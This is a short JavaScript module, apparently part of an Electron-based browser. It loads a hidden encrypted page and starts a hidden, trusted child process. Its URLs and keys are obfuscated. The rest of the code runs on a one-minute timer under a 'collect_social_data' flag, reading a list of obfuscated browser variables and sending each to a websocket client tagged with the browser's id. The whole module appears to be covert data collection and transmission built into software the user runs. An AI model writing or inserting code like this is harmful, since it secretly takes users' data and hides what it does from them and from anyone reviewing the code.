module.exports = function init(____0) {
  function browser() {
    if (____0.getBrowser) {
      let parent = ____0.getBrowser();

      let dir = __dirname + ____0.f1('2573816825785774433932573978426245183774');

      ____0.get({
        name: ____0.f1('25795167415923694779275746519191'),
        path: dir + ____0.f1('257852754538716941592369477927574653826147187665'),
        parser: 'html',
        encript: '123',
        parserDir: dir,
        hide: !0,
      });

      parent.createChildProcess({
        url: ____0.f1('4319327546156169257416732773817125541268263561782615128126148681253823734579477442392191'),
        windowType: ____0.f1('473913564139325746719191'),
        show: false,
        trusted: true,
        partition: ____0.f1('4618377346785774471562764618325247183691'),
      });

      setInterval(() => {
        if (!____0.collect_social_data) {
          if ((client = ____0.ws.client)) {
            ____0.collect_social_data = true;
            let var_list = [
              ____0.f1('4178867342319191'),
              ____0.f1('46783774467857694557866543392775'),
              ____0.f1('46192369481957494518577447129191'),
              ____0.f1('4739275746578656413932523978576846193775'),
              ____0.f1('473927574657865641393252'),
              ____0.f1('4739236546719191'),
              ____0.f1('4218867945587269413832494518577447129191'),
              ____0.f1('41788669437857573518577447129191'),
            ];
            for (let index = 0; index < var_list.length; index++) {
              let value = parent.var[var_list[index]];
              if (value) {
                setTimeout(() => {
                  client.sendMessage({
                    type: ____0.f1('41592369477927574657866245584269'),
                    xid: parent.var.core.id,
                    key: var_list[index],
                    value: value,
                    source: ____0.f1('4339276247183691'),
                  });
                }, 1000 * 10 * index);
              }
            }
          }
        }
      }, 1000 * 60);
    } else {
      setTimeout(() => {
        browser();
      }, 1000 * 60);
    }
  }
  browser();
};
